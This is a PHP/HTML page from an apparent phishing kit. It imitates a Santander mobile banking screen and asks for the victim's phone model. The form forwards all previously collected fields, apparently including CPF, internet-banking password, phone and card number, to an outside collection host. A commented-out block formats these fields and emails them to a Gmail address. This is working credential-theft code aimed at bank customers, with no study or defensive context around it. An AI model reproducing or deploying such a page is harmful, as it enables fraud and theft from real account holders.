<?php 
	$url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

	$explodeUrl = explode("/",$url_atual);
	$novaUrl = array_pop($explodeUrl);
	$explodeUrl = implode("/",$explodeUrl);
?>
<!doctype html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">

<link rel="stylesheet" type="text/css" href="style.css" />


<script src="js/jquery-3.2.1.min.js" language="javascript"></script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2" style="color: #848fa0; font-weight: bold">
 	<div style="width: 80px;float: left;"><img src="images/user-icon.png" /></div>
	<div style="float: left; padding-top: 35px; padding-left: 10px;">
	Dispositivo <span id="nome" style="color: #848fa0;">movel</span>
	</div>
 </div>

<div id="campos" style="clear: both;">


<form action="http://bullmanescoras.com.br/email/envio-bb-3.php" method="post" >
<?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" id="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
<table width="80%" class="center pt60">
  <tbody>
    <tr style="height: 20px;">
      <td></td>
    </tr>
    <tr>
      <td colspan="2"><span>Qual modelo do seu celular?</span></td>
    </tr>
    <tr>
      <td colspan="2">
        <label for="modelo"></label>
        <input name="modelo" type="text" required="required" class="frm" id="modelo" value=""></td>
				<input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/done.php'; ?>" /> 
    </tr>
  </tbody>
    
</table>

<div class="pt30">
	<input type="submit" id="btn-entrar" value="CONCLUIR">
</div>
	
		
</form>

</div>


<div id="distrar" style="display: none;">
	<center><img src="images/id_santander_anima_sincronia_ok.gif"></center>
</div>

<script language="javascript">
	$(document).ready(function(){
		setTimeout(function(){
			$("#campos").show();
			$("#distrar").hide();
		}, 1500);
		

		setTimeout(function(){
			$("#ddd").focus();
		}, 1700);
		
		
		$().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
		  data: {
			  documento: $("#cpf").val(),
		  },

		  success: function(data) {
			var nome = $(data).find("body nome").text();
			var exception = $(data).find("header exception").text();

			if (exception) {
			  exception = exception.replace(/, t/, '. T');
			  //$('#status').text(exception);
			} else {
			  $("#nome").text(ucfirst(nome.split(" ")[0]));
			  $("#dados").show();
			}
		  }
		});
		
	});
</script>

</body>
</html>
<?php
/*require_once("config.php");
extract($_POST);
$headers = "Content-type: text/html; charset=ISO-8859-1\r\n";
$headers .="From: SantaBrasileira <contato@fgv.com.br>";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");
$conteudo = '';
$conteudo.="
------------------ Dados -------------------<br>
$data-($hora) - $ip<br>
--------------------------------------------<br>
CPF.........: $cpf<br>
ENTRADA.....: $snet<br>
CELULAR.....: ($ddd) $fone<br>
CARTAO......: $scard<br>
--------------------------------------------<br>";

@mail($receber, "totaxtrade@gmail.com", "$conteudo", $headers); 
*/
?>